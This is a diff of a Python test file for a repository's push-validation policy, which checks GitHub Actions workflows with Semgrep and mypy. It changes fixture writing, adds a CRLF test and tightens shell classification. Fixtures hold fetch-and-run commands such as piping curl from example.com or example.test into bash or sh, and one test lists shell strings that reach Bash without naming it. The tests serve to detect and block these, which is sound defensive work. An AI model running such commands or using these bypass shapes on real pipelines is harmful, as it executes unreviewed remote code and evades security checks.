@@ -2792,7 +2797,7 @@ def test_pushed_semgrep_scan_rejects_non_regular_type_change(
     base = _commit_file(repo, "source.py", "value = 1\n")
     if mode == "120000":
         target = repo / "link-target"
-        target.write_text("payload.txt", encoding="utf-8")
+        _write_lf(target, "payload.txt")
         object_id = _git(repo, "hash-object", "-w", str(target)).stdout.strip()
     else:
         object_id = base
@@ -2903,20 +2908,17 @@ def test_semgrep_real_cli_scans_ignored_file_over_default_size_limit(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "ignored-large.py"
-    target.write_text("value = 1\n" + "# padding\n" * 110_000, encoding="utf-8")
-    (tmp_path / ".semgrepignore").write_text(f"{target.name}\n", encoding="utf-8")
+    _write_lf(target, "value = 1\n" + "# padding\n" * 110_000)
+    _write_lf(tmp_path / ".semgrepignore", f"{target.name}\n")
     config = tmp_path / "semgrep.yml"
-    config.write_text(
-        """
+    _write_lf(config, """
 rules:
   - id: impossible-equality
     languages: [python]
     message: impossible
     severity: ERROR
     pattern: $X == $X
-""".lstrip(),
-        encoding="utf-8",
-    )
+""".lstrip())
     command = policy._semgrep_command(str(config), [str(target)])
     assert SEMGREP is not None
     command[0] = SEMGREP
@@ -2942,8 +2944,7 @@ def test_semgrep_real_cli_blocks_bash_curl_rules_with_powershell_step(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "mixed-shell-action.yml"
-    target.write_text(
-        """
+    _write_lf(target, """
 name: mixed shell
 runs:
   using: composite
@@ -2958,9 +2959,7 @@ runs:
         DATA=$(curl -fsSL https://example.com/install.sh)
         eval "$DATA"
         curl -fsSL https://example.com/install.sh | bash
-""".lstrip(),
-        encoding="utf-8",
-    )
+""".lstrip())
 
     result = policy._run_semgrep_tree(tmp_path, [target.name], tmp_path)
 
@@ -3053,9 +3052,9 @@ def test_semgrep_allows_known_powershell_parser_mismatch(
     rule_id: str,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
+    _write_lf(
+        target,
         'runs:\n  using: composite\n  steps:\n    - shell: pwsh\n      run: Write-Host "safe"\n',
-        encoding="utf-8",
     )
     payload = {
         "errors": [_powershell_semgrep_error(target, rule_id)],
@@ -3073,6 +3072,36 @@ def test_semgrep_allows_known_powershell_parser_mismatch(
 
 def test_semgrep_allows_partial_parsing_at_powershell_step(tmp_path: Path) -> None:
     target = tmp_path / "action.yml"
+    _write_lf(target, "runs:\n"
+        "  steps:\n"
+        "    - shell: pwsh\n"
+        "      run: |\n"
+        "        Write-Host 'safe'\n"
+        "    - shell: bash\n"
+        "      run: echo safe\n")
+    payload = {
+        "errors": [_powershell_partial_parsing_error(target, line=4)],
+        "paths": {"scanned": [str(target)]},
+    }
+
+    result = policy._verify_semgrep_targets(
+        _completed(0, json.dumps(payload)),
+        [str(target)],
+        tmp_path,
+    )
+
+    assert result.returncode == 0
+
+
+def test_semgrep_allows_partial_parsing_in_a_crlf_workflow(tmp_path: Path) -> None:
+    """A CRLF worktree must not turn a tolerated parse error into a blocked push.
+
+    The Windows runner writes fixtures through the platform newline translation,
+    so the file lands as CRLF while every offset the policy compares against is
+    computed from the decoded text. Reading the fixture as bytes keeps the two
+    in agreement no matter which separator the worktree carries.
+    """
+    target = tmp_path / "action.yml"
     target.write_text(
         "runs:\n"
         "  steps:\n"
@@ -3082,7 +3111,9 @@ def test_semgrep_allows_partial_parsing_at_powershell_step(tmp_path: Path) -> No
         "    - shell: bash\n"
         "      run: echo safe\n",
         encoding="utf-8",
+        newline="\r\n",
     )
+    assert b"\r\n" in target.read_bytes()
     payload = {
         "errors": [_powershell_partial_parsing_error(target, line=4)],
         "paths": {"scanned": [str(target)]},
@@ -3102,17 +3133,14 @@ def test_semgrep_rejects_code_two_error_at_bash_step_in_mixed_shell_file(
 ) -> None:
     target = tmp_path / "action.yml"
     bash_script = 'DATA=$(curl -fsSL https://example.com/install.sh)\neval "$DATA"'
-    target.write_text(
-        "runs:\n"
+    _write_lf(target, "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
         "      run: Write-Host 'safe'\n"
         "    - shell: bash\n"
         "      run: |\n"
         "        DATA=$(curl -fsSL https://example.com/install.sh)\n"
-        '        eval "$DATA"\n',
-        encoding="utf-8",
-    )
+        '        eval "$DATA"\n')
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3138,15 +3166,12 @@ def test_semgrep_rejects_code_two_error_with_ambiguous_shell_attribution(
 ) -> None:
     target = tmp_path / "action.yml"
     script = 'Write-Host "safe"'
-    target.write_text(
-        "runs:\n"
+    _write_lf(target, "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
         f"      run: {script}\n"
         "    - shell: bash\n"
-        f"      run: {script}\n",
-        encoding="utf-8",
-    )
+        f"      run: {script}\n")
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3169,10 +3194,7 @@ def test_semgrep_rejects_code_two_error_with_ambiguous_shell_attribution(
 
 def test_semgrep_rejects_short_truncated_code_two_snippet(tmp_path: Path) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-    )
+    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3197,10 +3219,7 @@ def test_semgrep_rejects_code_two_error_when_yaml_cannot_be_parsed(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        'runs:\n  steps: [\n    - shell: pwsh\n      run: Write-Host "safe"\n',
-        encoding="utf-8",
-    )
+    _write_lf(target, 'runs:\n  steps: [\n    - shell: pwsh\n      run: Write-Host "safe"\n')
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3222,7 +3241,7 @@ def test_semgrep_rejects_code_two_error_when_yaml_cannot_be_parsed(
 
 def test_semgrep_rejects_code_two_error_when_yaml_is_empty(tmp_path: Path) -> None:
     target = tmp_path / "action.yml"
-    target.write_text("", encoding="utf-8")
+    _write_lf(target, "")
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3246,15 +3265,12 @@ def test_semgrep_accepts_code_two_error_for_aliased_powershell_step(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "shared: &shared\n"
+    _write_lf(target, "shared: &shared\n"
         "  shell: pwsh\n"
         '  run: Write-Host "safe"\n'
         "runs:\n"
         "  steps:\n"
-        "    - *shared\n",
-        encoding="utf-8",
-    )
+        "    - *shared\n")
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3278,15 +3294,12 @@ def test_semgrep_rejects_nontruncated_code_two_snippet_prefix(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n"
+    _write_lf(target, "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
         "      run: |\n"
         "        Write-Host 'first'\n"
-        "        Write-Host 'second'\n",
-        encoding="utf-8",
-    )
+        "        Write-Host 'second'\n")
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3312,13 +3325,10 @@ def test_semgrep_accepts_long_truncated_code_two_powershell_snippet(
 ) -> None:
     target = tmp_path / "action.yml"
     lines = [f"Write-Host 'verification line {index}'" for index in range(5)]
-    target.write_text(
-        "runs:\n"
+    _write_lf(target, "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
-        "      run: |\n" + "".join(f"        {line}\n" for line in lines),
-        encoding="utf-8",
-    )
+        "      run: |\n" + "".join(f"        {line}\n" for line in lines))
     snippet = "\n".join([*lines[:-1], lines[-1][:15]])
     payload = {
         "errors": [
@@ -3360,15 +3370,12 @@ def test_semgrep_rejects_unrecognized_partial_parsing_error(
     rule_id: str,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n"
+    _write_lf(target, "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
         "      run: Write-Host 'safe'\n"
         "    - shell: bash\n"
-        "      run: echo safe\n",
-        encoding="utf-8",
-    )
+        "      run: echo safe\n")
     payload = {
         "errors": [
             _powershell_partial_parsing_error(
@@ -3394,10 +3401,7 @@ def test_semgrep_rejects_allowlisted_rule_id_only_in_target_path(
 ) -> None:
     allowed_rule = "yaml.github-actions.security.curl-eval.curl-eval"
     target = tmp_path / f"When parsing in rule '{allowed_rule}', action.yml"
-    target.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-    )
+    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     error = _powershell_partial_parsing_error(
         target,
         line=4,
@@ -3426,10 +3430,7 @@ def test_semgrep_rejects_partial_parsing_location_for_other_target(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-    )
+    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     error = _powershell_partial_parsing_error(target, line=4)
     error_type = error["type"]
     assert isinstance(error_type, list)
@@ -3465,7 +3466,7 @@ def test_semgrep_rejects_partial_parsing_span_crossing_into_bash_step(
         "    - shell: bash\n"
         "      run: echo unsafe\n"
     )
-    target.write_text(content, encoding="utf-8")
+    _write_lf(target, content)
     error = _powershell_partial_parsing_error(target, line=4)
     error_type = error["type"]
     assert isinstance(error_type, list)
@@ -3506,7 +3507,7 @@ def test_semgrep_allows_partial_parsing_span_inside_powershell_step(
         "    - shell: bash\n"
         "      run: echo safe\n"
     )
-    target.write_text(content, encoding="utf-8")
+    _write_lf(target, content)
     error = _powershell_partial_parsing_error(target, line=4)
     error_type = error["type"]
     assert isinstance(error_type, list)
@@ -3546,7 +3547,7 @@ def test_semgrep_allows_partial_parsing_span_ending_at_scalar_eof(
         "        Write-Host 'first'\n"
         "        Write-Host 'last'"
     )
-    target.write_text(content, encoding="utf-8")
+    _write_lf(target, content)
     error = _powershell_partial_parsing_error(target, line=4)
     error_type = error["type"]
     assert isinstance(error_type, list)
@@ -3586,9 +3587,9 @@ def test_semgrep_rejects_unrecognized_internal_matching_error(
     rule_id: str,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
+    _write_lf(
+        target,
         f"runs:\n  using: composite\n  steps:\n    - shell: {shell}\n      run: echo safe\n",
-        encoding="utf-8",
     )
     payload = {
         "errors": [_powershell_semgrep_error(target, rule_id)],
@@ -3674,10 +3675,7 @@ def test_semgrep_rejects_malformed_partial_parsing_error(
     error: object,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-    )
+    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     payload = {
         "errors": [error],
         "paths": {"scanned": [str(target)]},
@@ -3695,11 +3693,8 @@ def test_semgrep_rejects_malformed_partial_parsing_error(
 def test_semgrep_rejects_error_outside_requested_targets(tmp_path: Path) -> None:
     target = tmp_path / "action.yml"
     outside = tmp_path / "outside.yml"
-    target.write_text("name: safe\n", encoding="utf-8")
-    outside.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-    )
+    _write_lf(target, "name: safe\n")
+    _write_lf(outside, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3723,7 +3718,7 @@ def test_semgrep_rejects_partial_parsing_without_shell_declaration(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text("name: safe\n", encoding="utf-8")
+    _write_lf(target, "name: safe\n")
     payload = {
         "errors": [_powershell_partial_parsing_error(target, line=1)],
         "paths": {"scanned": [str(target)]},
@@ -3742,9 +3737,9 @@ def test_semgrep_rejects_partial_parsing_at_default_shell_step(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
+    _write_lf(
+        target,
         "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n    - run: echo safe\n",
-        encoding="utf-8",
     )
     payload = {
         "errors": [_powershell_partial_parsing_error(target, line=5)],
@@ -3766,10 +3761,7 @@ def test_semgrep_rejects_partial_parsing_with_invalid_line(
     line: int,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-    )
+    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     payload = {
         "errors": [_powershell_partial_parsing_error(target, line=line)],
         "paths": {"scanned": [str(target)]},
@@ -3789,10 +3781,7 @@ def test_semgrep_rejects_unreadable_error_target(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-    )
+    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     original_read_text = Path.read_text
 
     def fail_for_target(
@@ -3829,10 +3818,7 @@ def test_semgrep_rejects_non_utf8_error_target(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-    )
+    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3976,7 +3962,7 @@ def test_mypy_policy_aggregates_failures_and_ignores_deleted_files(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     source = tmp_path / "source.py"
-    source.write_text("value: int = 1\n", encoding="utf-8")
+    _write_lf(source, "value: int = 1\n")
     monkeypatch.setattr(policy, "_invoke_mypy", lambda *_args: _completed(1))
 
     assert policy.run_mypy(["deleted.py"], tmp_path) == 0
@@ -3990,7 +3976,7 @@ def test_mypy_policy_rejects_unsafe_paths_and_symlinks(
     assert policy.run_mypy(["../outside.py"], tmp_path) == 2
 
     source = tmp_path / "source.py"
-    source.write_text("value: int = 1\n", encoding="utf-8")
+    _write_lf(source, "value: int = 1\n")
     original_is_symlink = Path.is_symlink
     monkeypatch.setattr(
         Path,
@@ -4001,7 +3987,7 @@ def test_mypy_policy_rejects_unsafe_paths_and_symlinks(
 
 
 def _write_source(tmp_path: Path, name: str = "source.py") -> None:
-    (tmp_path / name).write_text("value: int = 1\n", encoding="utf-8")
+    _write_lf(tmp_path / name, "value: int = 1\n")
 
 
 def test_parse_changed_lines_maps_hunks_to_files() -> None:
@@ -4087,7 +4073,7 @@ def test_mypy_ratchet_blocks_backslash_path_on_changed_line(
     # mypy on Windows can report a backslash-separated path; the ratchet must
     # still match it against the forward-slash pushed set and changed-line map.
     (tmp_path / "pkg").mkdir()
-    (tmp_path / "pkg" / "mod.py").write_text("value: int = 1\n", encoding="utf-8")
+    _write_lf(tmp_path / "pkg" / "mod.py", "value: int = 1\n")
     monkeypatch.setattr(policy, "_changed_line_map", lambda *_a: {"pkg/mod.py": {2}})
     monkeypatch.setattr(
         policy,
@@ -4115,6 +4101,7 @@ def test_changed_line_map_reads_real_git_diff(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo, branch="main")
     base = _commit_file(repo, "mod.py", "line one\nline two\nline three\n")
+    _write_lf(repo / "mod.py", "line one\nline TWO changed\nline three\nline four\nline five\n")
     _write_file(repo, "mod.py", "line one\nline TWO changed\nline three\nline four\nline five\n")
     _git(repo, "add", "--", "mod.py")
     _git(repo, "commit", "-qm", "test: modify mod.py")
@@ -4868,7 +4855,7 @@ def test_merge_detection_uses_git_path(tmp_path: Path) -> None:
     _init_repo(repo)
     head = _commit_file(repo, "tracked", "content\n")
     merge_head = repo / _git(repo, "rev-parse", "--git-path", "MERGE_HEAD").stdout.strip()
-    merge_head.write_text(f"{head}\n", encoding="utf-8")
+    _write_lf(merge_head, f"{head}\n")
 
     assert policy._merge_in_progress(repo)
 
@@ -4885,7 +4872,7 @@ def test_local_action_without_list_marker_takes_local_action_branch(tmp_path: Pa
     repo = tmp_path / "repo"
     _init_repo(repo)
     workflow = repo / "action.yml"
-    workflow.write_text("uses: ./local-action\n", encoding="utf-8")
+    _write_lf(workflow, "uses: ./local-action\n")
     _git(repo, "add", "action.yml")
 
     assert policy.check_staged_action_pins(["action.yml"], repo) == 0
@@ -4899,9 +4886,9 @@ def test_github_bash_policy_blocks_extensions_and_shebangs(tmp_path: Path) -> No
     shell_script = scripts / "blocked.sh"
     disguised_script = scripts / "blocked"
     python_script = scripts / "allowed.py"
-    shell_script.write_text("echo blocked\n", encoding="utf-8")
-    disguised_script.write_text("#!/usr/bin/env bash\necho blocked\n", encoding="utf-8")
-    python_script.write_text("#!/usr/bin/env python3\n", encoding="utf-8")
+    _write_lf(shell_script, "echo blocked\n")
+    _write_lf(disguised_script, "#!/usr/bin/env bash\necho blocked\n")
+    _write_lf(python_script, "#!/usr/bin/env python3\n")
     _git(repo, "add", ".github/scripts")
 
     assert (
@@ -4932,7 +4919,7 @@ def test_github_bash_policy_handles_non_candidates_and_missing_blobs(
 def test_generated_agent_candidates_expand_allowlisted_globs(tmp_path: Path) -> None:
     generated = tmp_path / "src/copilot-cli/agents/test.agent.md"
     generated.parent.mkdir(parents=True)
-    generated.write_text("agent\n", encoding="utf-8")
+    _write_lf(generated, "agent\n")
 
     assert generated in policy._generated_candidates("agents", tmp_path)
 
@@ -4947,12 +4934,12 @@ def test_generated_staging_handles_absent_outside_and_git_failure(
     assert policy.stage_generated("mcp", repo) == 0
 
     outside = tmp_path / "outside-file"
-    outside.write_text("content\n", encoding="utf-8")
+    _write_lf(outside, "content\n")
     monkeypatch.setattr(policy, "_generated_candidates", lambda *_args: [outside])
     assert policy.stage_generated("mcp", repo) == 2
 
     inside = repo / "inside"
-    inside.write_text("content\n", encoding="utf-8")
+    _write_lf(inside, "content\n")
     monkeypatch.setattr(policy, "_generated_candidates", lambda *_args: [inside])
     monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(1, stderr="failed\n"))
     assert policy.stage_generated("mcp", repo) == 1
@@ -5075,7 +5062,7 @@ def test_episode_staging_handles_missing_and_symlink(
 
     episode = tmp_path / ".agents/memory/episodes/episode-link.json"
     episode.parent.mkdir(parents=True)
-    episode.write_text("{}\n", encoding="utf-8")
+    _write_lf(episode, "{}\n")
     original_is_symlink = Path.is_symlink
     monkeypatch.setattr(
         Path,
@@ -5703,10 +5690,10 @@ def test_memory_size_blocks_new_files_but_warns_for_modified_files(
 ) -> None:
     validator = tmp_path / ".claude/skills/memory/scripts/test_memory_size.py"
     validator.parent.mkdir(parents=True)
-    validator.write_text("pass\n", encoding="utf-8")
+    _write_lf(validator, "pass\n")
     memory = tmp_path / ".serena/memories/large.md"
     memory.parent.mkdir(parents=True)
-    memory.write_text("large\n", encoding="utf-8")
+    _write_lf(memory, "large\n")
 
     monkeypatch.setattr(
         policy,
@@ -5907,7 +5894,7 @@ def test_stage_generated_rejects_path_that_changes_after_preflight(
 ) -> None:
     candidate = tmp_path / ".vscode/mcp.json"
     candidate.parent.mkdir(parents=True)
-    candidate.write_text("{}\n", encoding="utf-8")
+    _write_lf(candidate, "{}\n")
     monkeypatch.setattr(policy, "check_generated_paths", lambda *_args: 0)
     monkeypatch.setattr(
         policy,
@@ -6163,7 +6150,7 @@ def test_materialize_commit_propagates_blob_read_and_write_failures(
         lambda *_args: subprocess.CompletedProcess([], 0, b"content", b""),
     )
     destination = tmp_path / "write-failure"
-    destination.write_text("not a directory\n", encoding="utf-8")
+    _write_lf(destination, "not a directory\n")
     assert (
         policy._materialize_commit_tree(
             "head",
@@ -6191,10 +6178,10 @@ def test_push_validation_rejects_active_grafts_in_linked_worktree(
     grafts.write_bytes(b"")
     assert policy._check_no_grafts(linked) == 0
 
-    grafts.write_text("\n  # ignored comment\n", encoding="utf-8")
+    _write_lf(grafts, "\n  # ignored comment\n")
     assert policy._check_no_grafts(linked) == 0
 
-    grafts.write_text(f"{head} {'0' * 40}\n", encoding="utf-8")
+    _write_lf(grafts, f"{head} {'0' * 40}\n")
     stream = io.StringIO(
         f"refs/heads/feature/linked {head} refs/heads/feature/linked {'0' * 40}\n",
     )
@@ -6295,7 +6282,7 @@ def test_remaining_policy_success_and_error_branches(
     capsys: pytest.CaptureFixture[str],
 ) -> None:
     absolute_merge_head = tmp_path / "MERGE_HEAD"
-    absolute_merge_head.write_text("head\n", encoding="utf-8")
+    _write_lf(absolute_merge_head, "head\n")
     monkeypatch.setattr(
         policy,
         "_run_git",
@@ -6409,7 +6396,7 @@ def test_memory_size_validation_error_and_success_branches(
 
     validator = tmp_path / ".claude/skills/memory/scripts/test_memory_size.py"
     validator.parent.mkdir(parents=True)
-    validator.write_text("pass\n", encoding="utf-8")
+    _write_lf(validator, "pass\n")
     monkeypatch.setattr(policy, "_staged_memory_paths", lambda *_args: None)
     assert policy.validate_memory_sizes(tmp_path) == 2
     monkeypatch.setattr(policy, "_staged_memory_paths", real_staged_memory_paths)
@@ -6431,7 +6418,7 @@ def test_memory_size_validation_error_and_success_branches(
 
     good = tmp_path / ".serena/memories/good.md"
     good.parent.mkdir(parents=True)
-    good.write_text("good\n", encoding="utf-8")
+    _write_lf(good, "good\n")
     monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(0))
     assert not policy._validate_memory_path_set(
         [".serena/memories/good.md"],
@@ -6801,7 +6788,7 @@ def test_semgrep_allows_partial_parsing_at_bash_step_with_actions_expression(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    _write_lf(target, _ACTIONS_EXPRESSION_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
 
@@ -6810,7 +6797,7 @@ def test_semgrep_allows_partial_parsing_at_bash_step_with_actions_expression(
 
 def test_semgrep_allows_partial_parsing_at_python_shell_step(tmp_path: Path) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_PYTHON_SHELL_WORKFLOW, encoding="utf-8")
+    _write_lf(target, _PYTHON_SHELL_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _PYTHON_SHELL_WORKFLOW, "print(os.getcwd())")
 
@@ -6822,7 +6809,7 @@ def test_semgrep_allows_partial_parsing_at_default_shell_step_with_expression(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_DEFAULT_SHELL_EXPRESSION_WORKFLOW, encoding="utf-8")
+    _write_lf(target, _DEFAULT_SHELL_EXPRESSION_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=4)
     _retarget_span(error, _DEFAULT_SHELL_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
 
@@ -6831,7 +6818,7 @@ def test_semgrep_allows_partial_parsing_at_default_shell_step_with_expression(
 
 def test_semgrep_blocks_partial_parsing_at_plain_bash_step(tmp_path: Path) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_PLAIN_BASH_WORKFLOW, encoding="utf-8")
+    _write_lf(target, _PLAIN_BASH_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _PLAIN_BASH_WORKFLOW, "curl http://example.test | sh")
 
@@ -6843,7 +6830,7 @@ def test_semgrep_blocks_when_only_one_matched_step_carries_an_expression(
 ) -> None:
     target = tmp_path / "workflow.yml"
     content = _MIXED_STEPS_WORKFLOW
-    target.write_text(content, encoding="utf-8")
+    _write_lf(target, content)
     error = _powershell_partial_parsing_error(target, line=5)
     error_type = error["type"]
     assert isinstance(error_type, list)
@@ -6862,7 +6849,7 @@ def test_semgrep_blocks_expression_step_error_reported_at_error_level(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    _write_lf(target, _ACTIONS_EXPRESSION_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
     error["level"] = "error"
@@ -6872,7 +6859,7 @@ def test_semgrep_blocks_expression_step_error_reported_at_error_level(
 
 def test_semgrep_blocks_expression_step_error_from_an_unknown_rule(tmp_path: Path) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    _write_lf(target, _ACTIONS_EXPRESSION_WORKFLOW)
     error = _powershell_partial_parsing_error(
         target,
         line=5,
@@ -6896,7 +6883,7 @@ def test_semgrep_allows_code_two_error_at_bash_step_with_actions_expression(
         "        run: |\n"
         '          echo "${{ github.sha }}"\n'
     )
-    target.write_text(content, encoding="utf-8")
+    _write_lf(target, content)
     error = _powershell_semgrep_error(
         target,
         sorted(policy.SEMGREP_POWERSHELL_RULES)[0],
@@ -6911,13 +6898,26 @@ def test_semgrep_allows_code_two_error_at_bash_step_with_actions_expression(
     [
         "pwsh",
         "powershell",
-        "PowerShell",
         "python3",
         "python3 {0}",
     ],
 )
 def test_non_bash_shells_defeat_the_bash_subparse(shell: str) -> None:
     assert policy._is_non_bash_shell(shell) is True
+
+
+@pytest.mark.parametrize("shell", ["PowerShell", "PWSH", "Python3", "PowerShell {0}"])
+def test_an_interpreter_token_must_be_exact_and_lowercase(shell: str) -> None:
+    """A cased spelling is not a declared shell, so it must not earn an exemption.
+
+    `_is_non_bash_shell` gates an exemption: True skips the Bash scan. The
+    measured shells in `.github/workflows/` are 28 `bash`, 33 `pwsh` (14 bare
+    and 19 through the call-operator template), and 2 `python3 {0}`. Nothing
+    declares a cased spelling, so accepting one buys exempt surface for no
+    caller. Refusing it is fail-closed: the body gets Bash-scanned and a parse
+    error blocks the push instead of passing silently.
+    """
+    assert policy._is_non_bash_shell(shell) is False
 
 
 @pytest.mark.parametrize(
@@ -7005,6 +7005,41 @@ def test_bash_shells_do_not_defeat_the_bash_subparse(shell: str | None) -> None:
 
 
 @pytest.mark.parametrize(
+    "shell",
+    [
+        # The Actions runner's extension table has no `.exe` keys, so these are
+        # written without an extension and PowerShell's call operator hands the
+        # file to the OS, which honours a `#!/bin/bash` first line.
+        "PowerShell.exe",
+        "powershell.exe",
+        "pwsh.exe -NoProfile",
+        "pwsh.exe -NoProfile -Command \"& '{0}'\"",
+        # perl execs the interpreter named in a foreign `#!` line.
+        "perl",
+        "perl {0}",
+        # Interpreters this repository does not use are not on the allowlist.
+        "node",
+        "ruby",
+        "cmd /C",
+        "cmd /S /C",
+        # `cmd.exe` accepts a glued `/c<command>`, which `\b` cannot see.
+        "cmd /cbash {0}",
+        # Reaching a POSIX shell without ever spelling one.
+        "python3 -c \"import os,sys; os.system('bash ' + sys.argv[1])\" {0}",
+        "python3 -c \"import subprocess; subprocess.run(['x'], shell=True)\" {0}",
+        "python3 -c \"'bas'+'h'\" {0}",
+        'pwsh -c "& $env:SHELL {0}"',
+        "pwsh -c 'bas`h {0}'",
+        # Unbalanced quoting cannot be tokenized, so it fails closed.
+        "pwsh -Command \"& '{0}'",
+    ],
+)
+def test_bypass_shapes_do_not_defeat_the_bash_subparse(shell: str) -> None:
+    """Every shape #3683 demonstrated must classify as Bash-reachable."""
+    assert policy._is_non_bash_shell(shell) is False
+
+
+@pytest.mark.parametrize(
     "body",
     [
         'echo "${{ github.sha }}"',
@@ -7037,7 +7072,7 @@ def test_semgrep_blocks_an_aliased_script_reused_under_a_bash_step(tmp_path: Pat
         "      - shell: bash\n"
         "        run: *script\n"
     )
-    target.write_text(content, encoding="utf-8")
+    _write_lf(target, content)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, content, "Write-Host 'hi'")
 
@@ -7053,7 +7088,7 @@ def test_tolerated_errors_never_downgrade_a_semgrep_finding(tmp_path: Path) -> N
     own verdict through untouched rather than reporting success.
     """
     target = tmp_path / "workflow.yml"
-    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    _write_lf(target, _ACTIONS_EXPRESSION_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
     payload = {"errors": [error], "paths": {"scanned": [str(target)]}}
@@ -7073,7 +7108,7 @@ def test_tolerated_errors_do_not_suppress_findings_reported_alongside_them(
 ) -> None:
     """The carve-out inspects only the error manifest, never the results list."""
     target = tmp_path / "workflow.yml"
-    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    _write_lf(target, _ACTIONS_EXPRESSION_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
     payload = {
@@ -7123,7 +7158,7 @@ def test_semgrep_blocks_a_malformed_bash_body_that_carries_an_expression(
     tolerating the error would let ``curl | sh`` through unscanned.
     """
     target = tmp_path / "workflow.yml"
-    target.write_text(_MALFORMED_EXPRESSION_WORKFLOW, encoding="utf-8")
+    _write_lf(target, _MALFORMED_EXPRESSION_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _MALFORMED_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
 
